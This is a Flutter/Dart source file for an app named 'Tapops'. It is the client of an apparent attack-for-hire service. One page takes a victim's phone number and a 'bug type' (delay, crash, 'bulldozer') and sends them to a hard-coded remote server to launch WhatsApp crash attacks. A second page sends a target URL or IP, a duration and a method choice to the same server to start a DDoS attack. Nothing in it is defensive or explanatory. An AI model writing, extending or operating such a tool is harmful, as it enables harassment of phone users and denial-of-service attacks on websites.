import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:video_player/video_player.dart';
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'dart:convert';
import '../pages.dart';

class AttackPage extends StatefulWidget {
  final Map<String, dynamic> user;

  const AttackPage({super.key, required this.user});

  @override
  State<AttackPage> createState() => _AttackPageState();
}

class _AttackPageState extends State<AttackPage> {
  final TextEditingController _numberController = TextEditingController();
  String _selectedBug = '';
  String _selectedBugId = '';
  bool _isLoading = false;
  String _result = '';
  late VideoPlayerController _controller;

  @override
  void initState() {
    super.initState();
    _controller = VideoPlayerController.asset('assets/banner.mp4')
      ..initialize().then((_) {
        setState(() {});
        _controller.setLooping(true);
        _controller.setVolume(0.0);
        _controller.play();
      });
  }

  @override
  void dispose() {
    _controller.dispose();
    super.dispose();
  }

  Future<void> _launchAttack() async {
    if (_numberController.text.isEmpty || _selectedBugId.isEmpty) {
      setState(() {
        _result = '❌ Please fill all fields';
      });
      return;
    }

    setState(() {
      _isLoading = true;
      _result = '';
    });

    try {
      final username = widget.user['username']?.toString() ?? '';
      final response = await http.get(
        Uri.parse('http://146.190.80.13:2188/api?target=${_numberController.text}&type=$_selectedBugId&username=$username'),
      );

      if (response.statusCode == 200) {
        final responseBody = response.body;
        final Map<String, dynamic> responseData = json.decode(responseBody);
        
        final bool status = responseData['status'] ?? false;
        final String sender = responseData['sender'] ?? 'x';
        final String message = responseData['message'] ?? '';
        final String target = responseData['target'] ?? '';

        if (sender == 'x') {
          _showNoSenderDialog();
          setState(() {
            _result = '❌ No active WhatsApp sender found';
          });
          return;
        }
        else if (status) {
          setState(() {
            _result = '''
✅ ATTACK SUCCESSFULLY LAUNCHED!
• TARGET: $target
• BUG TYPE: $_selectedBug
• STATUS: ACTIVE
• MESSAGE: $message
''';
          });
        } else {
          setState(() {
            _result = '❌ Failed to launch attack: $message';
          });
        }
      } else {
        setState(() {
          _result = '❌ Server error: ${response.statusCode}';
        });
      }
    } catch (e) {
      setState(() {
        _result = '❌ Error: $e';
      });
    } finally {
      setState(() {
        _isLoading = false;
      });
    }
  }

  void _showNoSenderDialog() {
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) => AlertDialog(
        backgroundColor: const Color(0xFF1A0025),
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: const BorderSide(color: Color(0xFFFF0040), width: 2),
        ),
        title: const Row(
          children: [
            Icon(FontAwesomeIcons.whatsapp, color: Color(0xFFFF0040), size: 24),
            SizedBox(width: 10),
            Text(
              'No WhatsApp Sender',
              style: TextStyle(
                color: Color(0xFFFF0040),
                fontWeight: FontWeight.w800,
              ),
            ),
          ],
        ),
        content: const Text(
          'You need to add a WhatsApp sender first before launching attacks. '
          'Would you like to add one now?',
          style: TextStyle(
            color: Colors.white,
            fontSize: 14,
          ),
        ),
        actions: [
          TextButton(
            onPressed: () {
              Navigator.pop(context);
              Navigator.push(context, MaterialPageRoute(builder: (context) => SenderManagerPage(user: widget.user)));
            },
            style: TextButton.styleFrom(
              foregroundColor: const Color(0xFFFF0040),
            ),
            child: const Text(
              'ADD SENDER',
              style: TextStyle(
                fontWeight: FontWeight.w800,
              ),
            ),
          ),
          TextButton(
            onPressed: () => Navigator.pop(context),
            style: TextButton.styleFrom(
              foregroundColor: Colors.grey,
            ),
            child: const Text('CANCEL'),
          ),
        ],
      ),
    );
  }

  void _showBugSelection() {
    final bugOptions = [
      {
        'name': 'Xinvis',
        'id': 'delayv1'
      },
      {
        'name': 'Vaculoid', 
        'id': 'delayv2'
      },
      {
        'name': '7VLt',
        'id': 'crash'
      },
      {
        'name': 'magicCrl',
        'id': 'bulldozer'
      },
    ];

    showModalBottomSheet(
      context: context,
      backgroundColor: const Color(0xFF1A0025),
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.vertical(top: Radius.circular(25)),
      ),
      builder: (context) {
        return Container(
          padding: const EdgeInsets.all(25),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              const Text(
                'SELECT BUG TYPE',
                style: TextStyle(
                  color: Color(0xFFFF0040),
                  fontSize: 22,
                  fontWeight: FontWeight.w800,
                ),
              ),
              const SizedBox(height: 20),
              ...bugOptions.map((bug) => ListTile(
                leading: const Icon(FontAwesomeIcons.whatsapp, color: Color(0xFFFF0040)),
                title: Text(
                  bug['name']!,
                  style: const TextStyle(color: Colors.white, fontWeight: FontWeight.w600),
                ),
                onTap: () {
                  setState(() {
                    _selectedBug = bug['name']!;
                    _selectedBugId = bug['id']!;
                  });
                  Navigator.pop(context);
                },
              )).toList(),
            ],
          ),
        );
      },
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF0A0015),
      appBar: AppBar(
        backgroundColor: Colors.transparent,
        elevation: 0,
        title: const Text(
          'Tapops',
          style: TextStyle(
            fontSize: 24,
            fontWeight: FontWeight.w900,
            color: Color(0xFFFF0040),
            letterSpacing: 2,
          ),
        ),
        centerTitle: true,
      ),
      body: SingleChildScrollView(
        padding: const EdgeInsets.all(20),
        child: Column(
          children: [
            Container(
              height: 280,
              width: double.infinity,
              decoration: BoxDecoration(
                borderRadius: BorderRadius.circular(20),
                border: Border.all(color: const Color(0xFFFF0040), width: 2),
                boxShadow: [
                  BoxShadow(
                    color: const Color(0xFFFF0040).withOpacity(0.4),
                    blurRadius: 15,
                    spreadRadius: 2,
                  ),
                ],
              ),
              child: ClipRRect(
                borderRadius: BorderRadius.circular(18),
                child: _controller.value.isInitialized
                    ? AspectRatio(
                        aspectRatio: _controller.value.aspectRatio,
                        child: VideoPlayer(_controller),
                      )
                    : Container(
                        color: const Color(0xFF0A0015),
                        child: const Center(
                          child: CircularProgressIndicator(color: Color(0xFFFF0040)),
                        ),
                      ),
              ),
            ),
            const SizedBox(height: 20),
            Container(
              padding: const EdgeInsets.all(20),
              decoration: BoxDecoration(
                color: const Color(0xFF1A0025),
                borderRadius: BorderRadius.circular(20),
                border: Border.all(color: const Color(0xFFFF0040).withOpacity(0.4)),
                boxShadow: [
                  BoxShadow(
                    color: Colors.black.withOpacity(0.5),
                    blurRadius: 15,
                  ),
                ],
              ),
              child: Column(
                children: [
                  const Row(
                    children: [
                      Icon(FontAwesomeIcons.whatsapp, color: Color(0xFFFF0040), size: 20),
                      SizedBox(width: 10),
                      Text(
                        'WHATSAPP ATTACK',
                        style: TextStyle(
                          color: Color(0xFFFF0040),
                          fontSize: 16,
                          fontWeight: FontWeight.w800,
                        ),
                      ),
                    ],
                  ),
                  const SizedBox(height: 20),
                  TextField(
                    controller: _numberController,
                    style: const TextStyle(color: Colors.white, fontSize: 14),
                    decoration: InputDecoration(
                      labelText: 'Target number',
                      labelStyle: const TextStyle(color: Color(0xFF888888), fontSize: 14),
                      border: OutlineInputBorder(
                        borderRadius: BorderRadius.circular(12),
                      ),
                      focusedBorder: OutlineInputBorder(
                        borderRadius: BorderRadius.circular(12),
                        borderSide: const BorderSide(color: Color(0xFFFF0040), width: 2),
                      ),
                      enabledBorder: OutlineInputBorder(
                        borderRadius: BorderRadius.circular(12),
                        borderSide: BorderSide(color: const Color(0xFFFF0040).withOpacity(0.6)),
                      ),
                      prefixIcon: const Icon(Icons.phone_android_rounded, color: Color(0xFFFF0040), size: 20),
                    ),
                  ),
                  const SizedBox(height: 15),
                  GestureDetector(
                    onTap: _showBugSelection,
                    child: Container(
                      width: double.infinity,
                      padding: const EdgeInsets.all(15),
                      decoration: BoxDecoration(
                        border: Border.all(color: const Color(0xFFFF0040).withOpacity(0.6)),
                        borderRadius: BorderRadius.circular(12),
                        color: const Color(0xFF0A0015).withOpacity(0.3),
                      ),
                      child: Row(
                        mainAxisAlignment: MainAxisAlignment.spaceBetween,
                        children: [
                          Text(
                            _selectedBug.isEmpty ? 'Select bug type' : _selectedBug,
                            style: TextStyle(
                              color: _selectedBug.isEmpty ? const Color(0xFF888888) : Colors.white,
                              fontSize: 14,
                              fontWeight: FontWeight.w600,
                            ),
                          ),
                          const Icon(Icons.arrow_drop_down_rounded, color: Color(0xFFFF0040)),
                        ],
                      ),
                    ),
                  ),
                  const SizedBox(height: 20),
                  SizedBox(
                    width: double.infinity,
                    height: 50,
                    child: ElevatedButton(
                      onPressed: _isLoading ? null : _launchAttack,
                      style: ElevatedButton.styleFrom(
                        backgroundColor: const Color(0xFFFF0040),
                        foregroundColor: Colors.white,
                        shape: RoundedRectangleBorder(
                          borderRadius: BorderRadius.circular(12),
                        ),
                        elevation: 8,
                        shadowColor: const Color(0xFFFF0040).withOpacity(0.5),
                      ),
                      child: _isLoading
                          ? const SizedBox(
                              height: 20,
                              width: 20,
                              child: CircularProgressIndicator(color: Colors.white, strokeWidth: 2),
                            )
                          : const Row(
                              mainAxisAlignment: MainAxisAlignment.center,
                              children: [
                                Icon(Icons.rocket_launch_rounded, size: 20),
                                SizedBox(width: 8),
                                Text(
                                  'ATTACK',
                                  style: TextStyle(
                                    fontWeight: FontWeight.w900,
                                    fontSize: 16,
                                    letterSpacing: 1,
                                  ),
                                ),
                              ],
                            ),
                    ),
                  ),
                  if (_result.isNotEmpty) 
                    Container(
                      width: double.infinity,
                      padding: const EdgeInsets.all(15),
                      margin: const EdgeInsets.only(top: 20),
                      decoration: BoxDecoration(
                        color: _result.contains('❌') 
                            ? const Color(0xFFFF0040).withOpacity(0.15)
                            : Colors.green.withOpacity(0.15),
                        borderRadius: BorderRadius.circular(12),
                        border: Border.all(
                          color: _result.contains('❌') ? const Color(0xFFFF0040) : Colors.green,
                          width: 2,
                        ),
                      ),
                      child: Text(
                        _result,
                        style: TextStyle(
                          color: _result.contains('❌') ? const Color(0xFFFF0040) : Colors.green,
                          fontWeight: FontWeight.w600,
                          fontSize: 12,
                        ),
                      ),
                    ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }
}

class DDoSPage extends StatefulWidget {
  const DDoSPage({super.key});

  @override
  State<DDoSPage> createState() => _DDoSPageState();
}

class _DDoSPageState extends State<DDoSPage> {
  final TextEditingController _targetController = TextEditingController();
  final TextEditingController _timeController = TextEditingController();
  String _selectedMethod = '';
  bool _isLoading = false;
  String _result = '';

  Future<void> _launchDDoS() async {
    if (_targetController.text.isEmpty || _timeController.text.isEmpty || _selectedMethod.isEmpty) {
      setState(() {
        _result = '❌ Please fill all fields';
      });
      return;
    }

    setState(() {
      _isLoading = true;
      _result = '';
    });

    try {
      final response = await http.post(
        Uri.parse('http://146.190.80.13:2188/exc'),
        headers: {'Content-Type': 'application/json'},
        body: '{"target":"${_targetController.text}","time":"${_timeController.text}","method":"$_selectedMethod"}',
      );

      if (response.statusCode == 200) {
        setState(() {
          _result = '''
DDOS ATTACK LAUNCHED
TARGET: ${_targetController.text}
DURATION: ${_timeController.text}s
METHOD: $_selectedMethod
ATTACK IS NOW ACTIVE
''';
        });
      } else {
        setState(() {
          _result = '❌ Failed to launch attack';
        });
      }
    } catch (e) {
      setState(() {
        _result = '❌ Error: $e';
      });
    } finally {
      setState(() {
        _isLoading = false;
      });
    }
  }

  void _showMethodSelection() {
    showModalBottomSheet(
      context: context,
      backgroundColor: const Color(0xFF1A0025),
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.vertical(top: Radius.circular(25)),
      ),
      builder: (context) {
        return Container(
          padding: const EdgeInsets.all(25),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              const Text(
                'SELECT DDOS METHOD',
                style: TextStyle(
                  color: Color(0xFFFF0040),
                  fontSize: 22,
                  fontWeight: FontWeight.w800,
                ),
              ),
              const SizedBox(height: 20),
              ...[
                'KILL [HIGH INTENSITY]',
                'KOMIX [MIXED METHODS]',
                'R2 [RAPID RESPONSE]',
                'PSHT [POWERFUL STRIKE]',
                'PIDORAS [ADVANCED]',
                'EXERCIST [MAXIMUM POWER]',
              ].map((method) => ListTile(
                leading: const Icon(Icons.security_rounded, color: Color(0xFFFF0040)),
                title: Text(
                  method,
                  style: const TextStyle(color: Colors.white, fontWeight: FontWeight.w600),
                ),
                onTap: () {
                  setState(() {
                    _selectedMethod = method.split(' ')[0].toLowerCase();
                  });
                  Navigator.pop(context);
                },
              )).toList(),
            ],
          ),
        );
      },
    );
  }

  @override
  Widget build(BuildContext context) {
    return SingleChildScrollView(
      padding: const EdgeInsets.all(20),
      child: Column(
        children: [
          Container(
            padding: const EdgeInsets.all(20),
            decoration: BoxDecoration(
              color: const Color(0xFF1A0025),
              borderRadius: BorderRadius.circular(20),
              border: Border.all(color: const Color(0xFFFF0040).withOpacity(0.4)),
              boxShadow: [
                BoxShadow(
                  color: Colors.black.withOpacity(0.5),
                  blurRadius: 15,
                ),
              ],
            ),
            child: Column(
              children: [
                const Row(
                  children: [
                    Icon(Icons.shield_outlined, color: Color(0xFFFF0040), size: 24),
                    SizedBox(width: 10),
                    Text(
                      'DDOS ATTACK',
                      style: TextStyle(
                        color: Color(0xFFFF0040),
                        fontSize: 20,
                        fontWeight: FontWeight.w800,
                      ),
                    ),
                  ],
                ),
                const SizedBox(height: 20),
                TextField(
                  controller: _targetController,
                  style: const TextStyle(color: Colors.white, fontSize: 14),
                  decoration: InputDecoration(
                    labelText: 'Target url or ip address',
                    labelStyle: const TextStyle(color: Color(0xFF888888), fontSize: 14),
                    border: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(12),
                    ),
                    focusedBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(12),
                      borderSide: const BorderSide(color: Color(0xFFFF0040), width: 2),
                    ),
                    enabledBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(12),
                      borderSide: BorderSide(color: const Color(0xFFFF0040).withOpacity(0.6)),
                    ),
                    prefixIcon: const Icon(Icons.language_rounded, color: Color(0xFFFF0040), size: 20),
                  ),
                ),
                const SizedBox(height: 15),
                TextField(
                  controller: _timeController,
                  keyboardType: TextInputType.number,
                  style: const TextStyle(color: Colors.white, fontSize: 14),
                  decoration: InputDecoration(
                    labelText: 'Duration (seconds)',
                    labelStyle: const TextStyle(color: Color(0xFF888888), fontSize: 14),
                    border: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(12),
                    ),
                    focusedBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(12),
                      borderSide: const BorderSide(color: Color(0xFFFF0040), width: 2),
                    ),
                    enabledBorder: OutlineInputBorder(
                      borderRadius: BorderRadius.circular(12),
                      borderSide: BorderSide(color: const Color(0xFFFF0040).withOpacity(0.6)),
                    ),
                    prefixIcon: const Icon(Icons.timer_rounded, color: Color(0xFFFF0040), size: 20),
                  ),
                ),
                const SizedBox(height: 15),
                GestureDetector(
                  onTap: _showMethodSelection,
                  child: Container(
                    width: double.infinity,
                    padding: const EdgeInsets.all(15),
                    decoration: BoxDecoration(
                      border: Border.all(color: const Color(0xFFFF0040).withOpacity(0.6)),
                      borderRadius: BorderRadius.circular(12),
                      color: const Color(0xFF0A0015).withOpacity(0.3),
                    ),
                    child: Row(
                      mainAxisAlignment: MainAxisAlignment.spaceBetween,
                      children: [
                        Text(
                          _selectedMethod.isEmpty ? 'select ddos method' : _selectedMethod.toUpperCase(),
                          style: TextStyle(
                            color: _selectedMethod.isEmpty ? const Color(0xFF888888) : Colors.white,
                            fontSize: 14,
                            fontWeight: FontWeight.w600,
                          ),
                        ),
                        const Icon(Icons.arrow_drop_down_rounded, color: Color(0xFFFF0040)),
                      ],
                    ),
                  ),
                ),
                const SizedBox(height: 20),
                SizedBox(
                  width: double.infinity,
                  height: 50,
                  child: ElevatedButton(
                    onPressed: _isLoading ? null : _launchDDoS,
                    style: ElevatedButton.styleFrom(
                      backgroundColor: const Color(0xFFFF0040),
                      foregroundColor: Colors.white,
                      shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.circular(12),
                      ),
                      elevation: 8,
                      shadowColor: const Color(0xFFFF0040).withOpacity(0.5),
                    ),
                    child: _isLoading
                        ? const SizedBox(
                            height: 20,
                            width: 20,
                            child: CircularProgressIndicator(color: Colors.white, strokeWidth: 2),
                          )
                        : const Row(
                            mainAxisAlignment: MainAxisAlignment.center,
                            children: [
                              Icon(Icons.rocket_launch_rounded, size: 20),
                              SizedBox(width: 8),
                              Text(
                                'ATTACK',
                                style: TextStyle(
                                  fontWeight: FontWeight.w900,
                                  fontSize: 16,
                                  letterSpacing: 1,
                                ),
                              ),
                            ],
                          ),
                  ),
                ),
                if (_result.isNotEmpty)
                  Container(
                    width: double.infinity,
                    padding: const EdgeInsets.all(15),
                    margin: const EdgeInsets.only(top: 20),
                    decoration: BoxDecoration(
                      color: _result.contains('❌') 
                          ? const Color(0xFFFF0040).withOpacity(0.15)
                          : Colors.green.withOpacity(0.15),
                      borderRadius: BorderRadius.circular(12),
                      border: Border.all(
                        color: _result.contains('❌') ? const Color(0xFFFF0040) : Colors.green,
                        width: 2,
                      ),
                    ),
                    child: Text(
                      _result,
                      style: TextStyle(
                        color: _result.contains('❌') ? const Color(0xFFFF0040) : Colors.green,
                        fontWeight: FontWeight.w600,
                        fontSize: 12,
                      ),
                    ),
                  ),
              ],
            ),
          ),
        ],
      ),
    );
  }
}